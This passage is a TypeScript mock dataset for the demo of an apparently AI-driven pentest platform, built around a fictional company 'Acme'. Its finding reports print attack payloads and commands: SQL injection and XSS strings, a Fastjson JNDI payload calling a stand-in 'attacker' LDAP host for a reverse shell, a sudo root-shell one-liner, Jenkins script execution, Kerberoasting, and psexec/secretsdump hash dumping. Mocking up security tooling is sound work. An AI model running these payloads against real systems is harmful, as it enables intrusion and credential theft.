// Rich mock dataset for the Vercel demo (NEXT_PUBLIC_MOCK=1). Shapes track the
// current backend contract in lib/api.ts + lib/types.ts. All data is static and
// self-consistent (one company "Acme", a few tasks, findings, exploration graph,
// sessions/activity, traffic, agents, etc.) so every page looks populated.

import type {
  Activity,
  Agent,
  AgentDetail,
  Asset,
  Audit,
  Company,
  Conversation,
  ConvTokenSummary,
  DailyTokenBucket,
  Edge,
  Finding,
  FindingAsset,
  InterceptApprovalRow,
  InterceptAudit,
  InterceptPending,
  InterceptRule,
  LLMPoolStatus,
  LLMProfile,
  LLMTask,
  MCPServer,
  MCPTool,
  MissingSkill,
  PromptVar,
  PromptVersion,
  SessionTokenUsage,
  Settings,
  SkillCall,
  SkillItem,
  Stats,
  Task,
  TaskCategory,
  TaskNode,
  TaskTemplate,
  TokenTotal,
  TokenUsage,
  Tool,
  TrafficDetail,
  TrafficHost,
  TrafficResp,
} from "@/lib/types";

// A demo foi escrita com datas fixas, e o cenário inteiro envelhecia junto com o
// calendário: passados alguns meses, os gráficos com recorte de 7/30 dias ficavam
// vazios e as tarefas apareciam como "116d atrás". T() desloca todo o cenário em
// bloco, de modo que MOCK_ANCHOR caia hoje, preservando os intervalos entre os
// eventos — o que importa na narrativa é a distância entre eles, não a data.
const MOCK_ANCHOR = Date.UTC(2026, 6, 26, 4, 0, 0); // 2026-07-26T04:00:00Z, fim do cenário

// Deslocamento em dias inteiros, para a hora do dia de cada evento não mudar.
const MOCK_SHIFT_MS = Math.floor((Date.now() - MOCK_ANCHOR) / 86_400_000) * 86_400_000;

/** Desloca um instante do cenário para a janela de tempo atual. */
const T = (iso: string) => new Date(Date.parse(iso) + MOCK_SHIFT_MS).toISOString();

/** Versão em segundos de T(), para os campos *_unix. */
export const TU = (iso: string) => Math.floor(Date.parse(T(iso)) / 1000);

// ── Tasks ──────────────────────────────────────────────────────────────────
export const ACTIVE_TASK = "t-acme-web";

export const tasks: Task[] = [
  {
    id: "t-acme-web",
    category_id: 1,
    category_name: "Avaliação externa",
    description: "Pentest externo do site e do painel da Acme (acme.com)",
    goal: "Obter acesso de administrador ao painel de acme.com e confirmar a leitura de dados sensíveis de usuários.",
    status: "running",
    created_at: T("2026-07-24T09:12:00Z"),
    created_unix: TU("2026-07-24T09:12:00Z"),
    last_activity: T("2026-07-26T03:58:22Z"),
    last_activity_unix: TU("2026-07-26T03:58:22Z"),
    paused: false,
    active: true,
    in_flight: 3,
    findings: { critical: 1, high: 2, medium: 1, low: 0 },
    stalled: false,
    goals_total: 5,
    goals_met: 2,
    engine_mode: "exploring",
    llm_profile_id: 1,
    llm_profile_ids: [1, 2],
    active_llm_profile_id: 1,
    llm_failover_state: "ready",
    source_task_ids: [],
    tokens: { input_tokens: 1284500, output_tokens: 96320, cache_read_tokens: 890400, cache_write_tokens: 132000 },
  },
  {
    id: "t-acme-api",
    category_id: 2,
    category_name: "API dedicada",
    description: "Testes de escalada de privilégio e injeção em api.acme.com",
    goal: "Avaliar o risco de IDOR e injeção nos endpoints de pedidos e usuários de api.acme.com.",
    status: "running",
    created_at: T("2026-07-25T14:05:00Z"),
    created_unix: TU("2026-07-25T14:05:00Z"),
    last_activity: T("2026-07-26T03:40:10Z"),
    last_activity_unix: TU("2026-07-26T03:40:10Z"),
    paused: false,
    active: false,
    in_flight: 2,
    findings: { critical: 0, high: 1, medium: 1, low: 0 },
    stalled: false,
    goals_total: 4,
    goals_met: 1,
    engine_mode: "exploring",
    llm_profile_id: 1,
    llm_profile_ids: [1, 2],
    active_llm_profile_id: 1,
    llm_failover_state: "ready",
    source_task_ids: ["t-acme-web"],
    tokens: { input_tokens: 642300, output_tokens: 51200, cache_read_tokens: 401000, cache_write_tokens: 60000 },
  },
  {
    id: "t-shop-pay",
    category_id: 2,
    category_name: "API dedicada",
    description: "Fluxo de pagamento e pedidos de shop.acme.com",
    goal: "Avaliar escalada de privilégio, adulteração de valores e condição de corrida nos endpoints de pagamento e pedidos.",
    status: "paused",
    created_at: T("2026-07-22T08:30:00Z"),
    created_unix: TU("2026-07-22T08:30:00Z"),
    last_activity: T("2026-07-23T18:40:10Z"),
    last_activity_unix: TU("2026-07-23T18:40:10Z"),
    paused: true,
    active: false,
    in_flight: 0,
    stalled: false,
    goals_total: 4,
    goals_met: 1,
    engine_mode: "paused",
    llm_profile_id: 2,
    llm_profile_ids: [2, 1],
    active_llm_profile_id: 2,
    llm_failover_state: "ready",
    source_task_ids: ["t-acme-web", "t-acme-api"],
    tokens: { input_tokens: 233000, output_tokens: 18700, cache_read_tokens: 120000, cache_write_tokens: 22000 },
  },
  {
    id: "t-vpn-edge",
    category_id: 1,
    category_name: "Avaliação externa",
    description: "Reconhecimento da superfície exposta (VPN / serviços de borda)",
    goal: "Identificar serviços de borda exploráveis expostos por acme.com.",
    status: "done",
    created_at: T("2026-07-18T08:00:00Z"),
    created_unix: TU("2026-07-18T08:00:00Z"),
    completed_at: T("2026-07-20T22:11:00Z"),
    completed_unix: TU("2026-07-20T22:11:00Z"),
    last_activity: T("2026-07-20T22:11:00Z"),
    last_activity_unix: TU("2026-07-20T22:11:00Z"),
    paused: false,
    active: false,
    in_flight: 0,
    stalled: false,
    goals_total: 3,
    goals_met: 3,
    engine_mode: "idle",
    llm_profile_id: 1,
    llm_profile_ids: [1],
    active_llm_profile_id: 1,
    llm_failover_state: "ready",
    source_task_ids: [],
    tokens: { input_tokens: 512000, output_tokens: 40100, cache_read_tokens: 300000, cache_write_tokens: 41000 },
  },
];

export const taskCategories: TaskCategory[] = [
  {
    id: 1,
    name: "Avaliação externa",
    task_count: 2,
    created_at: T("2026-07-18T08:00:00Z"),
    updated_at: T("2026-07-25T08:00:00Z"),
  },
  {
    id: 2,
    name: "API dedicada",
    task_count: 2,
    created_at: T("2026-07-19T08:00:00Z"),
    updated_at: T("2026-07-24T08:00:00Z"),
  },
];

export const taskTemplates: TaskTemplate[] = [
  {
    id: 1,
    name: "Pentest web externo",
    description:
      "Pentest caixa-preta sobre a superfície exposta do alvo, cobrindo sites, endpoints e os pontos de administração comuns.",
    goal: "Identificar e validar falhas que levem a acesso não autorizado, vazamento de dados sensíveis ou comprometimento do servidor.",
    created_at: T("2026-07-20T08:00:00Z"),
    updated_at: T("2026-07-25T08:00:00Z"),
  },
  {
    id: 2,
    name: "Escalada de privilégio em API",
    description:
      "Testes dedicados a autenticação, autorização em nível de objeto e fronteiras de papel na API do alvo.",
    goal: "Confirmar a existência de IDOR, escalada horizontal, escalada vertical e acesso a dados em massa.",
    created_at: T("2026-07-19T08:00:00Z"),
    updated_at: T("2026-07-24T08:00:00Z"),
  },
];

export const getTask = (id: string) => tasks.find((t) => t.id === id);

const grandTotal: TokenTotal = tasks.reduce(
  (a, t) => ({
    input_tokens: a.input_tokens + (t.tokens?.input_tokens ?? 0),
    output_tokens: a.output_tokens + (t.tokens?.output_tokens ?? 0),
    cache_read_tokens: a.cache_read_tokens + (t.tokens?.cache_read_tokens ?? 0),
    cache_write_tokens: a.cache_write_tokens + (t.tokens?.cache_write_tokens ?? 0),
  }),
  { input_tokens: 0, output_tokens: 0, cache_read_tokens: 0, cache_write_tokens: 0 },
);

// ── Stats ──────────────────────────────────────────────────────────────────
export function stats(
  taskId?: string,
  state: { tasks?: readonly Task[]; findings?: readonly Finding[]; activeTask?: string } = {},
): Stats & { active_task?: unknown } {
  const taskList = state.tasks ?? tasks;
  const findingList = state.findings ?? findings;
  const base: Stats = {
    assets: assets.length,
    engine_mode: "exploring",
    llm_configured: true,
    roe_enabled: true,
    findings_confirmed: findingList.filter((f) => f.severity !== "low").length,
  };
  const selectedTaskID = taskId ?? state.activeTask ?? ACTIVE_TASK;
  const t = taskList.find((item) => item.id === selectedTaskID);
  if (!t) return base;
  return {
    ...base,
    engine_mode: t.engine_mode ?? "idle",
    findings_confirmed: findingList.filter((f) => f.task_id === t.id).length,
    active_task: {
      id: t.id,
      in_flight: t.in_flight,
      goals_total: t.goals_total,
      goals_met: t.goals_met,
      engine_mode: t.engine_mode,
      paused: t.paused,
    },
  };
}

// ── Company + Assets (new unified model) ─────────────────────────────────────
export const companies: Company[] = [
  {
    id: 1,
    name: "Acme Corp",
    logo: "",
    asset_count: 18,
    scope: [
      { id: 1, company_id: 1, kind: "domain", domain: "acme.com", raw: "acme.com", reason: "Domínio raiz" },
      { id: 2, company_id: 1, kind: "cidr", net: "203.0.113.0/24", raw: "203.0.113.0/24" },
      { id: 3, company_id: 1, kind: "ip", net: "198.51.100.20", raw: "198.51.100.20" },
    ],
  },
];

export const assets: Asset[] = [
  {
    id: 1,
    type: "root_domain",
    company_id: 1,
    task_ids: [1],
    domain: "acme.com",
    root_domain: "acme.com",
    icp: "Registro BR-2021-xxxx",
    record_type: "A",
    record_value: ["203.0.113.10"],
    last_seen: T("2026-07-26T02:00:00Z"),
  },
  {
    id: 2,
    type: "subdomain",
    company_id: 1,
    task_ids: [1],
    domain: "www.acme.com",
    root_domain: "acme.com",
    record_type: "CNAME",
    record_value: "acme.com",
    last_seen: T("2026-07-26T02:01:00Z"),
  },
  {
    id: 3,
    type: "subdomain",
    company_id: 1,
    task_ids: [2],
    domain: "api.acme.com",
    root_domain: "acme.com",
    record_type: "A",
    record_value: ["203.0.113.11"],
    last_seen: T("2026-07-26T02:02:00Z"),
  },
  {
    id: 4,
    type: "subdomain",
    company_id: 1,
    task_ids: [3],
    domain: "shop.acme.com",
    root_domain: "acme.com",
    record_type: "A",
    record_value: ["203.0.113.12"],
    last_seen: T("2026-07-26T02:03:00Z"),
  },
  {
    id: 5,
    type: "subdomain",
    company_id: 1,
    task_ids: [4],
    domain: "vpn.acme.com",
    root_domain: "acme.com",
    record_type: "A",
    record_value: ["198.51.100.20"],
    last_seen: T("2026-07-20T02:00:00Z"),
  },
  {
    id: 6,
    type: "subdomain",
    company_id: 1,
    task_ids: [1],
    domain: "admin.acme.com",
    root_domain: "acme.com",
    record_type: "A",
    record_value: ["203.0.113.10"],
    last_seen: T("2026-07-26T02:04:00Z"),
  },
  {
    id: 7,
    type: "ip",
    company_id: 1,
    task_ids: [1, 2],
    ip: "203.0.113.10",
    c_segment: "203.0.113.0",
    open_ports: [
      { port: 80, service: "http" },
      { port: 443, service: "https" },
      { port: 22, service: "ssh" },
    ],
    last_seen: T("2026-07-26T02:05:00Z"),
  },
  {
    id: 8,
    type: "ip",
    company_id: 1,
    task_ids: [2],
    ip: "203.0.113.11",
    c_segment: "203.0.113.0",
    open_ports: [{ port: 443, service: "https" }],
    last_seen: T("2026-07-26T02:06:00Z"),
  },
  {
    id: 9,
    type: "ip",
    company_id: 1,
    task_ids: [4],
    ip: "198.51.100.20",
    c_segment: "198.51.100.0",
    open_ports: [
      { port: 443, service: "https" },
      { port: 500, service: " isakmp" },
    ],
    last_seen: T("2026-07-20T02:00:00Z"),
  },
  {
    id: 10,
    type: "service",
    company_id: 1,
    task_ids: [1],
    ip: "203.0.113.10",
    port: 443,
    service_type: "https",
    service_name: "nginx/1.24.0",
    last_seen: T("2026-07-26T02:07:00Z"),
  },
  {
    id: 11,
    type: "service",
    company_id: 1,
    task_ids: [4],
    ip: "198.51.100.20",
    port: 22,
    service_type: "ssh",
    service_name: "OpenSSH 8.9p1",
    last_seen: T("2026-07-20T02:00:00Z"),
  },
  {
    id: 12,
    type: "app",
    company_id: 1,
    task_ids: [1],
    url: "https://www.acme.com",
    app_name: "Site da Acme",
    category: "corp",
    status_code: 200,
    content_length: 48213,
    page_title: "Acme Corp — site institucional",
    technologies: ["Nginx", "React", "Cloudflare"],
    favicon_mmh3: "-1580860059",
    last_seen: T("2026-07-26T02:08:00Z"),
  },
  {
    id: 13,
    type: "app",
    company_id: 1,
    task_ids: [1],
    url: "https://admin.acme.com",
    app_name: "Painel administrativo",
    category: "admin",
    status_code: 200,
    content_length: 12044,
    page_title: "Acme Admin — login",
    technologies: ["Nginx", "Vue", "Element-UI"],
    last_seen: T("2026-07-26T02:09:00Z"),
  },
  {
    id: 14,
    type: "app",
    company_id: 1,
    task_ids: [2],
    url: "https://api.acme.com",
    app_name: "REST API",
    category: "api",
    status_code: 401,
    content_length: 45,
    page_title: "",
    technologies: ["Kong", "Node.js"],
    last_seen: T("2026-07-26T02:10:00Z"),
  },
  {
    id: 15,
    type: "endpoint",
    company_id: 1,
    task_ids: [2],
    url: "https://api.acme.com/v1/orders",
    method: "GET",
    status_code: 200,
    params: [
      { name: "id", in: "query" },
      { name: "page", in: "query" },
    ],
    last_seen: T("2026-07-26T02:11:00Z"),
  },
  {
    id: 16,
    type: "endpoint",
    company_id: 1,
    task_ids: [2],
    url: "https://api.acme.com/v1/users/me",
    method: "GET",
    status_code: 200,
    last_seen: T("2026-07-26T02:12:00Z"),
  },
  {
    id: 17,
    type: "endpoint",
    company_id: 1,
    task_ids: [1],
    url: "https://admin.acme.com/login",
    method: "POST",
    status_code: 200,
    params: [{ name: "username" }, { name: "password" }],
    last_seen: T("2026-07-26T02:13:00Z"),
  },
  {
    id: 18,
    type: "endpoint",
    company_id: 1,
    task_ids: [1],
    url: "https://www.acme.com/search",
    method: "GET",
    status_code: 200,
    params: [{ name: "q", in: "query" }],
    last_seen: T("2026-07-26T02:14:00Z"),
  },
  // Ativos da rede interna (descobertos por movimentação lateral DMZ→rede interna)
  {
    id: 19,
    type: "ip",
    company_id: 1,
    task_ids: [1],
    ip: "10.0.20.15",
    c_segment: "10.0.20.0",
    open_ports: [
      { port: 80, service: "http" },
      { port: 22, service: "ssh" },
    ],
    last_seen: T("2026-07-25T15:40:00Z"),
  },
  {
    id: 20,
    type: "ip",
    company_id: 1,
    task_ids: [1],
    ip: "10.10.10.10",
    c_segment: "10.10.10.0",
    open_ports: [
      { port: 88, service: "kerberos" },
      { port: 389, service: "ldap" },
      { port: 445, service: "smb" },
    ],
    last_seen: T("2026-07-25T21:00:00Z"),
  },
  {
    id: 21,
    type: "ip",
    company_id: 1,
    task_ids: [1],
    ip: "10.10.10.5",
    c_segment: "10.10.10.0",
    open_ports: [{ port: 445, service: "smb" }],
    last_seen: T("2026-07-25T21:00:00Z"),
  },
  {
    id: 22,
    type: "ip",
    company_id: 1,
    task_ids: [1],
    ip: "10.10.10.20",
    c_segment: "10.10.10.0",
    open_ports: [{ port: 8080, service: "http-proxy" }],
    last_seen: T("2026-07-25T21:00:00Z"),
  },
  {
    id: 23,
    type: "service",
    company_id: 1,
    task_ids: [1],
    ip: "10.10.10.20",
    port: 8080,
    service_type: "http",
    service_name: "Jenkins 2.289",
    last_seen: T("2026-07-25T21:35:00Z"),
  },
  {
    id: 24,
    type: "service",
    company_id: 1,
    task_ids: [1],
    ip: "10.10.10.10",
    port: 445,
    service_type: "smb",
    service_name: "Windows Server 2019 DC",
    last_seen: T("2026-07-25T23:55:00Z"),
  },
  {
    id: 25,
    type: "app",
    company_id: 1,
    task_ids: [1],
    url: "http://10.10.10.20:8080",
    app_name: "Jenkins (interno)",
    category: "ci",
    status_code: 200,
    content_length: 14200,
    page_title: "Jenkins Dashboard",
    technologies: ["Jenkins", "Java"],
    last_seen: T("2026-07-25T21:35:00Z"),
  },
  {
    id: 26,
    type: "endpoint",
    company_id: 1,
    task_ids: [1],
    url: "http://10.10.10.20:8080/script",
    method: "GET",
    status_code: 200,
    last_seen: T("2026-07-25T21:35:00Z"),
  },
];

export const assetCounts: Record<string, number> = assets.reduce<Record<string, number>>((m, a) => {
  m[a.type] = (m[a.type] ?? 0) + 1;
  return m;
}, {});

// assetRef converte um id de ativo na referência de ativo pendurada no finding (o label segue a ordem de valores do coverageNodeLabel do backend:
// URL > domínio > IP > nome do app). A árvore da visão "por ativo" depende dessas referências
// para pendurar os achados nos ativos.
function assetRef(id: number): FindingAsset {
  const asset = assets.find((candidate) => candidate.id === id);
  if (!asset) throw new Error(`mock assetRef: unknown asset ${id}`);
  return {
    id: String(id),
    type: asset.type,
    label: asset.url || asset.domain || asset.ip || asset.app_name || String(id),
  };
}

// ── Findings ─────────────────────────────────────────────────────────────────
export const findings: Finding[] = [
  {
    id: "f-1",
    assets: [assetRef(18)],
    vulnclass: "SQL Injection",
    name: "Injeção de SQL baseada em erro na busca do site",
    severity: "high",
    status: "pending",
    report:
      '## Visão geral\n\nO parâmetro `q` de `www.acme.com/search` tem **injeção de SQL baseada em erro** (MSSQL), permitindo ler a versão do banco, a estrutura das tabelas e até dados sensíveis.\n\n## Impacto\n\n- Permite ler a estrutura das tabelas e os dados de usuários e pedidos do banco `acme_prod`\n- O erro devolvido na resposta facilita montar a exploração rapidamente; risco alto\n\n## Passos para reproduzir\n\n1. Disparar a injeção baseada em erro:\n\n```\nGET /search?q=1\' AND 1=CONVERT(int,@@version)--\n```\n\n2. A resposta devolve o erro com a versão do MSSQL, confirmando a injeção\n3. Enumerar os bancos: `sqlmap -u "https://www.acme.com/search?q=1" --dbs`\n\n## Correção recomendada\n\n- Trocar tudo por consultas parametrizadas, sem concatenação de strings\n- Desligar o detalhamento de erros em produção\n- Dar o mínimo de privilégio à conta do banco e desabilitar extensões perigosas como `xp_cmdshell`\n',
    summary: "O parâmetro q de www.acme.com/search tem injeção de SQL baseada em erro",
    evidence:
      "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → devolve erro do MSSQL com a versão, permitindo ler a estrutura do banco.",
    intent_id: "i-2",
    task_id: "t-acme-web",
    task_description: "Pentest externo do site e do painel da Acme",
    ts: T("2026-07-26T01:20:00Z"),
  },
  {
    id: "f-2",
    assets: [assetRef(15)],
    vulnclass: "IDOR",
    severity: "high",
    status: "pending",
    summary: "api.acme.com/v1/orders?id= permite ler pedidos de outras pessoas",
    evidence:
      "Trocar id=1001 por id=1002 devolve o pedido de outra pessoa (com endereço de entrega e telefone); não há verificação de propriedade.",
    intent_id: "i-5",
    task_id: "t-acme-api",
    task_description: "Testes de escalada de privilégio e injeção em api.acme.com",
    ts: T("2026-07-26T02:44:00Z"),
  },
  {
    id: "f-3",
    assets: [assetRef(3)],
    vulnclass: "Weak JWT",
    severity: "high",
    status: "pending",
    summary: "O JWT da API usa chave fraca e pode ser forjado por força bruta offline",
    evidence:
      "HS256 com a chave 'secret'; o john quebra em 5 segundos, permitindo forjar qualquer sub e escalar privilégio.",
    task_id: "t-acme-api",
    task_description: "Testes de escalada de privilégio e injeção em api.acme.com",
    ts: T("2026-07-26T03:02:00Z"),
  },
  {
    id: "f-4",
    assets: [assetRef(18)],
    vulnclass: "Reflected XSS",
    severity: "medium",
    status: "pending",
    summary: "A página de busca não escapa o parâmetro q: XSS refletido",
    evidence: "q=<script>alert(document.domain)</script> é devolvido sem tratamento no título do resultado.",
    task_id: "t-acme-web",
    task_description: "Pentest externo do site e do painel da Acme",
    ts: T("2026-07-25T22:10:00Z"),
  },
  {
    id: "f-5",
    assets: [assetRef(2)],
    vulnclass: "Exposed .git",
    severity: "medium",
    status: "pending",
    summary: "www.acme.com expõe o diretório .git, permitindo reconstruir o código-fonte",
    evidence:
      "GET /.git/HEAD → 200; o git-dumper reconstrói o código do backend e comentários com a string de conexão do banco.",
    task_id: "t-acme-web",
    task_description: "Pentest externo do site e do painel da Acme",
    ts: T("2026-07-25T20:30:00Z"),
  },
  {
    id: "f-6",
    assets: [assetRef(17)],
    vulnclass: "Default Credentials",
    severity: "high",
    status: "pending",
    summary: "Senha padrão admin/admin123 no painel de admin.acme.com",
    evidence: "Login bem-sucedido no painel administrativo, com gestão de usuários e pedidos.",
    intent_id: "i-3",
    task_id: "t-acme-web",
    task_description: "Pentest externo do site e do painel da Acme",
    ts: T("2026-07-26T03:50:00Z"),
  },
  {
    id: "f-7",
    assets: [assetRef(17)],
    vulnclass: "Open Redirect",
    severity: "low",
    status: "pending",
    summary: "Redirecionamento aberto pelo parâmetro next após o login",
    evidence: "/login?next=https://evil.example devolve 302 para um site externo depois do login.",
    task_id: "t-acme-web",
    task_description: "Pentest externo do site e do painel da Acme",
    ts: T("2026-07-25T19:12:00Z"),
  },
  {
    id: "f-8",
    assets: [assetRef(17)],
    vulnclass: "Missing Rate Limit",
    severity: "medium",
    status: "pending",
    summary: "O endpoint de login não tem limite de taxa e permite força bruta",
    evidence: "1000 tentativas por minuto sem bloqueio e sem captcha.",
    task_id: "t-acme-web",
    task_description: "Pentest externo do site e do painel da Acme",
    ts: T("2026-07-25T18:40:00Z"),
  },
  {
    id: "f-9",
    assets: [assetRef(16)],
    vulnclass: "Verbose Error",
    severity: "low",
    status: "pending",
    summary: "O erro 500 da API devolve a pilha e vaza caminhos e versões do framework",
    evidence: "Provocar um 500 devolve a pilha do Node.js, com caminhos absolutos e versões das dependências.",
    task_id: "t-acme-api",
    task_description: "Testes de escalada de privilégio e injeção em api.acme.com",
    ts: T("2026-07-25T23:05:00Z"),
  },
  {
    id: "f-10",
    assets: [assetRef(4)],
    vulnclass: "Outdated Component",
    severity: "medium",
    status: "pending",
    summary: "A loja usa um componente antigo com RCE conhecido",
    evidence:
      "A impressão digital aponta o componente v2.3.1, correspondente ao CVE-2024-xxxx de RCE por desserialização.",
    task_id: "t-shop-pay",
    task_description: "Fluxo de pagamento e pedidos de shop.acme.com",
    ts: T("2026-07-23T15:00:00Z"),
  },
  // ── Achados de alto risco na cadeia profunda externa→interna (active task) ──
  {
    id: "f-11",
    vulnclass: "Hardcoded Credentials",
    severity: "high",
    status: "pending",
    summary: "Credencial de banco fixa no código vazado: sa/Acme@2021",
    evidence:
      "O git-dumper reconstruiu www.acme.com/.git e obteve config.php, com a senha do banco em texto claro — depois confirmada como reutilizável na rede interna.",
    intent_id: "ig",
    task_id: "t-acme-web",
    task_description: "Pentest externo do site e do painel da Acme",
    ts: T("2026-07-25T20:36:00Z"),
  },
  {
    id: "f-12",
    assets: [assetRef(4)],
    vulnclass: "Deserialization RCE",
    name: "Execução remota de comandos por desserialização do Fastjson na loja",
    severity: "critical",
    status: "confirmed",
    report:
      '## Visão geral\n\nO endpoint `/api/import` de `shop.acme.com` usa **Fastjson 1.2.24** para interpretar JSON controlado pelo usuário, sem `safeMode`, o que permite indicar qualquer classe por `@type` e disparar **injeção JNDI → execução remota de comandos**.\n\n## Impacto\n\n- Um atacante executa comandos arbitrários no servidor web da DMZ sem autenticação (`www-data@dmz-web01`)\n- Combinado com a elevação seguinte, vira o trampolim de entrada na rede interna\n\n## Passos para reproduzir\n\n1. Montar o payload JNDI:\n\n```json\n{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}\n```\n\n2. `POST /api/import` com `Content-Type: application/json`\n3. O alvo conecta de volta ao dnslog e o shell reverso é estabelecido\n\n## Correção recomendada\n\n- Atualizar o Fastjson para **1.2.83+** e ligar o `safeMode`\n- Exigir autenticação e validar a origem em `/api/import`\n- Restringir a saída: impedir que servidores de aplicação iniciem conexões LDAP/RMI para fora\n',
    summary: "shop.acme.com: execução remota de comandos por desserialização do Fastjson 1.2.24",
    evidence:
      "POST /api/import com payload JNDI (@type:JdbcRowSetImpl) → conexão de volta ao dnslog e shell reverso estabelecido (www-data@dmz-web01).",
    intent_id: "i7",
    task_id: "t-acme-web",
    task_description: "Pentest externo do site e do painel da Acme",
    ts: T("2026-07-25T15:40:00Z"),
  },
  {
    id: "f-13",
    assets: [assetRef(19)],
    vulnclass: "Privilege Escalation",
    severity: "high",
    status: "pending",
    summary: "No ponto de apoio na DMZ, um sudo NOPASSWD mal configurado permite elevar a root",
    evidence:
      "sudo -l mostra (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'os.setuid(0);os.system(\"/bin/sh\")' entrega root direto.",
    intent_id: "i8",
    task_id: "t-acme-web",
    task_description: "Pentest externo do site e do painel da Acme",
    ts: T("2026-07-25T16:20:00Z"),
  },
  {
    id: "f-14",
    assets: [assetRef(19), assetRef(21)],
    vulnclass: "Network Segmentation",
    severity: "medium",
    status: "pending",
    summary: "O host da DMZ tem duas placas de rede ligadas à rede interna: o isolamento de borda falha",
    evidence:
      "A segunda placa de dmz-web01 está em 10.10.10.0/24 e alcança o controlador de domínio, o servidor de arquivos e o Jenkins direto da DMZ, furando a segmentação.",
    intent_id: "i9",
    task_id: "t-acme-web",
    task_description: "Pentest externo do site e do painel da Acme",
    ts: T("2026-07-25T21:00:00Z"),
  },
  {
    id: "f-15",
    assets: [assetRef(26)],
    vulnclass: "Unauthenticated RCE",
    severity: "high",
    status: "pending",
    summary: "Jenkins interno: Script Console sem autenticação com execução remota de comandos",
    evidence:
      "GET /script executa Groovy sem login: 'whoami'.execute().text → SYSTEM; e exporta do cofre de credenciais a conta de domínio acme\\svc_deploy.",
    intent_id: "i11",
    task_id: "t-acme-web",
    task_description: "Pentest externo do site e do painel da Acme",
    ts: T("2026-07-25T21:50:00Z"),
  },
  {
    id: "f-16",
    assets: [assetRef(21)],
    vulnclass: "Kerberoasting",
    severity: "high",
    status: "pending",
    summary: "A conta de serviço de domínio svc_sql é vulnerável a Kerberoast e tem senha fraca",
    evidence:
      "GetUserSPNs pede o TGS de svc_sql e o hashcat -m 13100 quebra offline a senha Sql@2020; a conta pertence ao grupo de administração do SQL.",
    intent_id: "i12",
    task_id: "t-acme-web",
    task_description: "Pentest externo do site e do painel da Acme",
    ts: T("2026-07-25T23:20:00Z"),
  },
  {
    id: "f-17",
    assets: [assetRef(20)],
    vulnclass: "Domain Compromise",
    name: "Controle total do controlador de domínio DC01 (Domain Admin)",
    severity: "critical",
    status: "confirmed",
    report:
      "## Visão geral\n\nA partir do RCE no Fastjson exposto na internet, firmou-se um ponto de apoio na DMZ; em seguida, elevação por sudo, travessia pela segunda placa de rede e RCE sem autenticação no Jenkins renderam a conta de domínio `svc_deploy`, que pertence a **Domain Admins** — levando ao controle total do controlador de domínio **DC01**.\n\n## Impacto\n\n- Privilégio de administrador de domínio, com controle de todas as máquinas e contas\n- O `secretsdump` exporta os hashes NTLM de todo o domínio (incluindo `krbtgt`), permitindo um golden ticket e permanência de longo prazo\n- Alvo interno atingido\n\n## Passos para reproduzir\n\n1. Entrar como `svc_deploy` e exportar os hashes:\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. Com privilégio SYSTEM no DC01, exportar todos os hashes do domínio\n\n## Correção recomendada\n\n- Reduzir o privilégio das contas de serviço, tirá-las de Domain Admins e adotar administração em camadas (tiering)\n- Resetar `krbtgt` duas vezes seguidas e trocar as senhas das contas de serviço por senhas fortes\n- Corrigir o isolamento entre DMZ e rede interna, além da cadeia de RCE e elevação descrita acima\n",
    summary: "Controlador de domínio DC01 dominado (Domain Admin) — alvo interno atingido",
    evidence:
      "svc_deploy pertence a Domain Admins; o psexec.py entra no DC01 com ela e obtém SYSTEM, e o secretsdump exporta os hashes NTLM de todo o domínio (incluindo krbtgt), completando o controle do alvo.",
    intent_id: "i13",
    task_id: "t-acme-web",
    task_description: "Pentest externo do site e do painel da Acme",
    ts: T("2026-07-26T00:20:00Z"),
  },
];

// ── Exploration graph (active task) ──────────────────────────────────────────
// Modelo atual: a raiz é fact/state=origin (renderizada como "Início"); payload é uma string JSON,
// goal usa text, os demais usam summary. Estrutura: raiz→objetivo(spawns)→intenção(spawns)→fato/vulnerabilidade(yields),
// vulnerabilidade→objetivo(proves), dica→intenção(derived_from).
const P = (o: Record<string, string>) => JSON.stringify(o);

export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
  nodes: [
    {
      id: "root",
      type: "fact",
      payload: P({ summary: "Raiz: acme.com — da internet à rede interna em profundidade" }),
      priority: 0,
      state: "origin",
      origin: "system",
      ts: T("2026-07-24T09:12:00Z"),
    },

    // ── Objetivos (decompostos pelo agent goals, com apostas crescentes até os alvos da rede interna conforme os achados surgem) ──
    {
      id: "g1",
      type: "goal",
      payload: P({ text: "Obter acesso de administrador ao painel de acme.com" }),
      priority: 9,
      state: "met",
      origin: "goals",
      ts: T("2026-07-24T09:13:00Z"),
    },
    {
      id: "g2",
      type: "goal",
      payload: P({ text: "Ler dados sensíveis de usuários" }),
      priority: 8,
      state: "open",
      origin: "goals",
      ts: T("2026-07-24T09:13:00Z"),
    },
    {
      id: "g3",
      type: "goal",
      payload: P({ text: "Romper a DMZ a partir da internet e firmar um ponto de apoio interno" }),
      priority: 9,
      state: "met",
      origin: "goals",
      ts: T("2026-07-25T14:10:00Z"),
    },
    {
      id: "g4",
      type: "goal",
      payload: P({ text: "Movimentação lateral interna até dominar o alvo DC01" }),
      priority: 10,
      state: "met",
      origin: "goals",
      ts: T("2026-07-25T20:00:00Z"),
    },

    // ── Camada 1 · reconhecimento externo / vulnerabilidades externas ──
    {
      id: "i1",
      type: "intent",
      payload: P({ summary: "Enumeração de subdomínios e varredura de portas em acme.com" }),
      priority: 6,
      state: "done",
      origin: "planner",
      ts: T("2026-07-24T09:20:00Z"),
    },
    {
      id: "i2",
      type: "intent",
      payload: P({ summary: "Teste de senha padrão e senha fraca no painel admin" }),
      priority: 9,
      state: "done",
      origin: "planner",
      ts: T("2026-07-26T03:30:00Z"),
    },
    {
      id: "i3",
      type: "intent",
      payload: P({ summary: "Enumerar as funções do painel e os endpoints de dados de usuário" }),
      priority: 8,
      state: "running",
      origin: "planner",
      ts: T("2026-07-26T03:55:00Z"),
    },
    {
      id: "i4",
      type: "intent",
      payload: P({ summary: "Sondagem de injeção de SQL em www.acme.com/search" }),
      priority: 8,
      state: "done",
      origin: "planner",
      ts: T("2026-07-25T22:00:00Z"),
    },
    {
      id: "i5",
      type: "intent",
      payload: P({ summary: "Teste de IDOR no endpoint de pedidos de api.acme.com" }),
      priority: 8,
      state: "running",
      origin: "planner",
      ts: T("2026-07-26T02:30:00Z"),
    },
    {
      id: "ig",
      type: "intent",
